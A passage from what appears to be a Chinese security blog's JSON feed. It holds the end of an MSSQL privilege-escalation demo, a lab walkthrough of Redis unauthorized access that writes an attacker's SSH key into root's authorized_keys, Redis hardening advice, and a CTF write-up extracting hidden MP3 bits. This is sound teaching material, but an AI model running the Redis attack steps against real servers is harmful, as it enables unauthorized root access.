class=\"string\">&#x27;SandBoxMode&#x27;</span>,<span class=\"string\">&#x27;REG_DWORD&#x27;</span> ,<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ad Hoc Distributed Queries&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<p>至此，SQL Server (MSSQL) 提权攻击演示完毕。</p>\n",
            "tags": [
                "数据库安全"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "Redis提权攻击",
            "date_published": "2022-09-26T16:02:13.000Z",
            "content_html": "<p><strong>Redis</strong>（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI <a href=\"https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80\">C 语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728\"> 数据库</a>，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由<a href=\"https://baike.baidu.com/item/Pivotal\"> Pivotal</a> 赞助。</p>\n<h2 id=\"0x00-redis提权攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x00-redis提权攻击\">#</a> 0x00 Redis 提权攻击</h2>\n<p>​\t<strong>Redis</strong> 在默认情况下，会绑定在 0.0.0.0:<strong>6379</strong> 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 <code>暴露到公网</code> 上。</p>\n<p>​\t如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>\n<p>​\t攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 <code>/root/.ssh</code>  文件夹的 <code>authotrized_keys</code>  文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\"><strong>类型</strong></th>\n<th style=\"text-align:left\"><strong>IP</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>目标靶机</strong></td>\n<td style=\"text-align:left\">Ubuntu18.04</td>\n<td style=\"text-align:left\">192.168.138.143</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>攻击主机</strong></td>\n<td style=\"text-align:left\">Kali2022</td>\n<td style=\"text-align:left\">192.168.138.145</td>\n</tr>\n</tbody>\n</table>\n<p>如果没有攻击机没有安装 ssh 则：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">安装</span></span><br><span class=\"line\">sudo apt install openssh-server</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">启动ssh服务</span></span><br><span class=\"line\">sudo service ssh start</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-被攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x01-被攻击机部分准备工作\">#</a> 0x01 被攻击机部分准备工作</h2>\n<p>在 Ubuntu 安装 redis 服务器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212305161.png\" alt=\"image-20220926212305161\"></p>\n<p>修改 /etc/redis/redis.conf，总共有三点：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212807655.png\" alt=\"image-20220926212807655\"></p>\n<p>①去除 bind</p>\n<p><img src=\"image-20220926213107025.png\" alt=\"image-20220926213107025\"></p>\n<p>②daemonize yes</p>\n<p><img src=\"image-20220926213521318.png\" alt=\"image-20220926213521318\"></p>\n<p>③protected-mode no</p>\n<p><img src=\"image-20220926232253189.png\" alt=\"image-20220926232253189\"></p>\n<p>重启服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">service redis stop</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">以root身份启动redis服务</span></span><br><span class=\"line\">sudo redis-server /etc/redis/redis.conf</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">尝试在服务器上自己连一下</span></span><br><span class=\"line\">redis-cli</span><br><span class=\"line\">(显示127.0.0.1:6379则OK)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232522408.png\" alt=\"image-20220926232522408\"></p>\n<h2 id=\"0x02-攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x02-攻击机部分准备工作\">#</a> 0x02 攻击机部分准备工作</h2>\n<p>在攻击机上生成 rsa 秘钥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214148985.png\" alt=\"\"></p>\n<p>重定向到 key.txt</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /home/kali/.ssh</span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214549834.png\" alt=\"image-20220926214549834\"></p>\n<p>第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车</p>\n<p><img src=\"image-20220926214811675.png\" alt=\"image-20220926214811675\"></p>\n<p>之后，我们在攻击机（也就是我的 kali）上安装 redis-cli</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class=\"line\">tar -zxf redis-stable.tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入到 redis-stable 目录</span></span><br><span class=\"line\">cd redis-stable</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译</span></span><br><span class=\"line\">make</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">拷贝</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了</span></span><br><span class=\"line\">sudo cp ./src/redis-cli /usr/bin/</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220032721.png\" alt=\"image-20220926220032721\"></p>\n<p>出现如下字样就说明安装成功：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">redis-cli</span><br><span class=\"line\">回车</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220238790.png\" alt=\"image-20220926220238790\"></p>\n<p>将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143</p>\n<p><img src=\"image-20220926220116946.png\" alt=\"image-20220926220116946\"></p>\n<h2 id=\"0x03-开始攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x03-开始攻击\">#</a> 0x03 开始攻击</h2>\n<p>拿到 redis 的 shell 后基本操作：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">info  #查看redis的信息和服务器信息</span><br><span class=\"line\">flushall 删除全部数据</span><br><span class=\"line\">del key  删除键为key的数据</span><br><span class=\"line\">get key  得到参数key的数据</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926234426901.png\" alt=\"image-20220926234426901\"></p>\n<p>在我们的攻击机 (kali) 上运行如下代码：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test</span><br><span class=\"line\">看到回显了OK以后</span><br><span class=\"line\">redis-cli -h 192.168.138.143进入shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926222112479.png\" alt=\"image-20220926222112479\"></p>\n<p>将目录切换到 /root/.ssh</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926231146929.png\" alt=\"image-20220926231146929\"></p>\n<p>设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232746706.png\" alt=\"\"></p>\n<p>最后，回到生成秘钥的终端：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">使用ssh命令 以root用户的身份 连接“被攻击机”的ip</span></span><br><span class=\"line\">ssh root@192.168.138.143</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232832651.png\" alt=\"image-20220926232832651\"></p>\n<p>至此，redis 提权攻击完成。</p>\n<h2 id=\"0x04-修复建议安全加固\"><a class=\"markdownIt-Anchor\" href=\"#0x04-修复建议安全加固\">#</a> 0x04 修复建议 / 安全加固</h2>\n<h3 id=\"1禁止一些高危命令重启redis才能生效\"><a class=\"markdownIt-Anchor\" href=\"#1禁止一些高危命令重启redis才能生效\">#</a> <strong>1. 禁止一些高危命令</strong> (重启 redis 才能生效)</h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>或者另起名字</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;name1&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;name2&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;name3&quot;</span></span><br></pre></td></tr></table></figure>\n<p>来禁用远程修改 DB 文件地址</p>\n<h3 id=\"2以低权限运行-redis-服务\"><a class=\"markdownIt-Anchor\" href=\"#2以低权限运行-redis-服务\">#</a> <strong>2. 以低权限运行 Redis 服务</strong></h3>\n<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>\n<h3 id=\"3为-redis-添加密码验证\"><a class=\"markdownIt-Anchor\" href=\"#3为-redis-添加密码验证\">#</a> <strong>3. 为 Redis 添加密码验证</strong></h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">requirepass</span> <span class=\"string\">mypassword</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"4禁止外网访问-redis\"><a class=\"markdownIt-Anchor\" href=\"#4禁止外网访问-redis\">#</a> <strong>4. 禁止外网访问 Redis</strong></h3>\n<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">bind</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"string\">::1</span></span><br></pre></td></tr></table></figure>\n<p>redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。</p>\n<h3 id=\"5保证-authorized_keys-文件的安全\"><a class=\"markdownIt-Anchor\" href=\"#5保证-authorized_keys-文件的安全\">#</a> <strong>5. 保证 authorized_keys 文件的安全</strong></h3>\n<p>为了保证安全，您应该阻止其他用户添加新的公钥。</p>\n<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh</span><br></pre></td></tr></table></figure>\n<p><strong>注意:</strong> 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>\n<h3 id=\"6修改默认端口\"><a class=\"markdownIt-Anchor\" href=\"#6修改默认端口\">#</a> <strong>6. 修改默认端口</strong></h3>\n<p>修改 redis.conf 文件， 找到并修改原来的 <code>port 6379</code>  ，比如改成 <code>port 17033</code> ，让人摸不着头脑。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">port 17033 </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "数据库安全"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/",
            "url": "https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/",
            "title": "Misc——私有bit隐写",
            "date_published": "2022-09-17T06:02:32.000Z",
            "content_html": "<h2 id=\"0x01-知识点\"><a class=\"markdownIt-Anchor\" href=\"#0x01-知识点\">#</a> <strong>0x01 知识点</strong></h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef FrameHeader</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;// 类型     字段名:bit数</span><br><span class=\"line\">unsigned int sync:12;                        //同步信息</span><br><span class=\"line\">unsigned int version:2;                      //版本</span><br><span class=\"line\">unsigned int layer: 2;                       //层</span><br><span class=\"line\">unsigned int error protection:1;             //CRC校验</span><br><span class=\"line\">unsigned int bitrate_index:4;                //位率</span><br><span class=\"line\">unsigned int sampling_frequency:2;           //采样频率</span><br><span class=\"line\">unsigned int padding:1;                      //帧长调节</span><br><span class=\"line\">unsigned int private:1;                      //保留字 【通常藏有flag】</span><br><span class=\"line\">unsigned int mode:2;                         //声道模式</span><br><span class=\"line\">unsigned int mode extension:2;        \t\t //扩充模式</span><br><span class=\"line\">unsigned int copyright:1;                    //版权   【通常藏有flag】</span><br><span class=\"line\">unsigned int original:1;                     //原版标志</span><br><span class=\"line\">unsigned int emphasis:2;                     //强调模式</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>帧长度是压缩时每一帧的长度， <code>包括帧头</code> 的 4 个字节（32bit）。它将填充的空位也计算在内。</li>\n<li>padding 的值会影响每一帧的长度（具体分析见下面的题目），因为只有 1 位，因此长度也只限于在 0 和 1 之间变化</li>\n</ul>\n<h2 id=\"0x02-题目分析\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目分析\">#</a> 0x02 题目分析</h2>\n<p>将解压后的 <code>1.mp3</code>  文件用 010Editor 打开</p>\n<p>可以看到一个 mp3 文件，里面基本上由 mf 数组构成。</p>\n<p><img src=\"image-20220917115510767.png\" alt=\"image-20220917115510767\"></p>\n<p>分析详见图片</p>\n<p><img src=\"image-20220917120013835.png\" alt=\"image-20220917120013835\"></p>\n<p>接着，可以发现，每个 mf 数组大小不一，有的是 0x1A1，有的 0x1A2</p>\n<p><img src=\"image-20220917120301874.png\" alt=\"image-20220917120301874\"></p>\n<blockquote>\n<p>图中可知，private_bit 的数值的在 0 和 1 中变化，可以让 <code>copyright</code>  、 <code>private_bit</code>  这样的单 bit 位在 0 和 1 之间发生改变，进而影响了单独 mf 数组的大小。因此，这两位在整个 mf 数组中连续拼接可能藏有 flag 或者重要的信息，优先提取。</p>\n</blockquote>\n<h2 id=\"0x03-解析脚本\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解析脚本\">#</a> 0x03 解析脚本</h2>\n<p>脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">   <span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\">   <span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">   n = <span class=\"number\">0x399D0</span> + <span class=\"number\">2</span>  <span class=\"comment\"># 起始位置，为什么+2 下面有解释</span></span><br><span class=\"line\">   target_bit = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">   flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">   file = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;1.mp3&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"comment\"># 以二进制打开文件</span></span><br><span class=\"line\">   <span class=\"comment\"># 提取</span></span><br><span class=\"line\">   <span class=\"keyword\">while</span> n &lt; <span class=\"number\">0x294C6A</span>:  <span class=\"comment\"># 结束位置</span></span><br><span class=\"line\">       file.seek(n, <span class=\"number\">0</span>) <span class=\"comment\"># 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)</span></span><br><span class=\"line\">       byte = file.read(<span class=\"number\">1</span>)  <span class=\"comment\">#往后读取一个字节（8位）</span></span><br><span class=\"line\">       padding = <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">2</span>] <span class=\"comment\">#从中提取倒数第2个bit 也就是padding的值 ord函数，是chr函数的对应，将字符变成10进制数字</span></span><br><span class=\"line\">       target_bit += <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">1</span>] <span class=\"comment\">#从中提取倒数第1个bit 也就是private_bit的值，需要累加拼接</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span> padding == <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">           n += <span class=\"number\">0x1A2</span></span><br><span class=\"line\">       <span class=\"keyword\">else</span>:</span><br><span class=\"line\">           n += <span class=\"number\">0x1A1</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">print</span>(target_bit)</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">#textArr = re.findall(&#x27;.&#123;&#x27;+str(8)+&#x27;&#125;&#x27;, result)</span></span><br><span class=\"line\">   textArr = re.findall(<span class=\"string\">r&#x27;\\d&#123;8&#125;&#x27;</span>, target_bit) <span class=\"comment\">#利用正则匹配每8个数字为一组，将其变为字符串数组方便处理</span></span><br><span class=\"line\">   <span class=\"built_in\">print</span>(textArr)</span><br><span class=\"line\">   <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> textArr:</span><br><span class=\"line\">       flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i, <span class=\"number\">2</span>)).strip(<span class=\"string\">&#x27;\\n&#x27;</span>)     <span class=\"comment\">#int(&#x27;二进制数&#x27;, 2) 就转成了10进制   chr(&#x27;10进制数&#x27;) 就转成字符</span></span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"comment\">#print(flag) #发现后面有很多未知空字符，删也删不掉</span></span><br><span class=\"line\">   flag = re.findall(<span class=\"string\">r&#x27;\\w+\\&#123;.+\\&#125;&#x27;</span>,flag) <span class=\"comment\">#用正则匹配标准flag</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag[<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n<p 0k4_YOu_Seem_s0_cl3ver_t0_find_f1ag!=\"\">flag</p>\n<p><img src=\"image-20220917134916608.png\" alt=\"image-20220917134916608\"></p>\n<h2 id=\"0x04-常用正则补充\"><a class=\"markdownIt-Anchor\" href=\"#0x04-常用正则补充\">#</a> 0x04 常用正则 (补充)</h2>\n<p>①<strong>显示不可打印的字符</strong></p>\n<table>\n<thead>\n<tr>\n<th>字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\\a</td>\n<td>报警</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>退格</td>\n</tr>\n<tr>\n<td>\\f</td>\n<td>换页</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>换行</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>回车</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>字表符</td>\n</tr>\n</tbody>\n</table>\n<p>②<strong>指定预定义的字符集</strong></p>\n<table>\n<thead>\n<tr>\n<th>字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\\d</td>\n<td>任意一个十进制数字 [0-9]</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>任意一个非十进制数字</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>任意一个空白字符 (空格、换行符、换页符、回车符、字表符)</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>任意一个非空白字符</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>任意一个单词字符</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>任意个非单词字符</td>\n</tr>\n</tbody>\n</table>\n<p>③<strong>限定符 (？*+{n，m}.)</strong><br>\n 限定符主要是用来限定每个字符串出现的次数。</p>\n<table>\n<thead>\n<tr>\n<th>限定字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>？</td>\n<td>零次或一次</td>\n</tr>\n<tr>\n<td>*</td>\n<td>零次或多次</td>\n</tr>\n<tr>\n<td>+</td>\n<td>一次或多次</td>\n</tr>\n<tr>\n<td n=\"\"></td>\n<td>n 次</td>\n</tr>\n<tr>\n<td n,=\"\"></td>\n<td>至少 n 次</td>\n</tr>\n<tr>\n<td n,m=\"\"></td>\n<td>n 到 m 次</td>\n</tr>\n<tr>\n<td>.</td>\n<td>匹配任意一个字符（不包含换行符）</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"0x05-再来一道\"><a class=\"markdownIt-Anchor\" href=\"#0x05-再来一道\">#</a> 0x05 再来一道</h2>\n<p>翻看了几帧发现 <code>private_bit</code>  位都是 0，似乎并没有存储数据。但是在翻看的时候发现，<ins> <code>uint32 copyright</code>  这一位似乎内藏玄机</ins>，这一位在相邻几帧的数据有 0 有 1，查询得知这是版权位，通常不会出现不同帧有 0 有 1 的情况。</p>\n<p>于是决定将 <code>copyright</code>  位的数据提取出来看看。</p>\n<p><img src=\"image-20220917134512128.png\" alt=\"image-20220917134512128\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">0xF05A4</span> + <span class=\"number\">2</span>  <span class=\"comment\"># 起始位置，为什么+2 下面有解释</span></span><br><span class=\"line\">target_bit = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;2.mp3&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>)  <span class=\"comment\"># 以二进制打开文件</span></span><br><span class=\"line\"><span class=\"comment\"># 提取</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &lt; <span class=\"number\">0xC12623</span>:  <span class=\"comment\"># 结束位置</span></span><br><span class=\"line\">    file.seek(n, <span class=\"number\">0</span>)  <span class=\"comment\"># 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)</span></span><br><span class=\"line\">    byte = file.read(<span class=\"number\">1</span>)  <span class=\"comment\"># 往后读取一个字节（8位）</span></span><br><span class=\"line\">    padding = <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">2</span>]  <span class=\"comment\"># 从中提取倒数第2个bit 也就是padding的值</span></span><br><span class=\"line\">    file.seek(n + <span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    byte = file.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">    target_bit += <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">4</span>]  <span class=\"comment\"># 从中提取倒数第1个bit 也就是copyright的值，需要累加拼接</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> padding == <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">        n += <span class=\"number\">0x415</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        n += <span class=\"number\">0x414</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(target_bit)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># textArr = re.findall(&#x27;.&#123;&#x27;+str(8)+&#x27;&#125;&#x27;, result)</span></span><br><span class=\"line\">textArr = re.findall(<span class=\"string\">r&#x27;\\d&#123;8&#125;&#x27;</span>, target_bit)  <span class=\"comment\"># 利用正则匹配每8个数字为一组，将其变为字符串数组方便处理</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(textArr)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> textArr:</span><br><span class=\"line\">    flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i, <span class=\"number\">2</span>)).strip(<span class=\"string\">&#x27;\\n&#x27;</span>)  <span class=\"comment\"># int(&#x27;二进制数&#x27;, 2) 就转成了10进制   chr(&#x27;10进制数&#x27;) 就转成字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = re.findall(<span class=\"string\">r&#x27;\\w+\\&#123;.+\\&#125;&#x27;</span>,flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag[<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n<p b3d7bed5-e8da-4d9c-848c-e5d332d63bcd=\"\">flag</p>\n<p><img src=\"image-20220917134626086.png\" alt=\"image-20220917134626086\"></p>\n",
            "tags": [
                "CTF小训",
                "Misc"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/",
            "url": "https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/",
            "title": "测试文章",
            "date_published": "2022-07-13T19:13:28.000Z",
            "content_html": "<p>这是一篇测试文章</p>\n<img src=\"/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png\" class=\"\" title=\"图片引用方法一\">\n<p><img src=\"test.png\" alt=\"图片引用方法二\"></p>\n",
            "tags": [
                "原创"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/07/13/hello-world/",
            "url": "https://kiyomijin.github.io/2022/07/13/hello-world/",
            "title": "Hello World",
            "date_published": "2022-07-13T15:20:21.111Z",
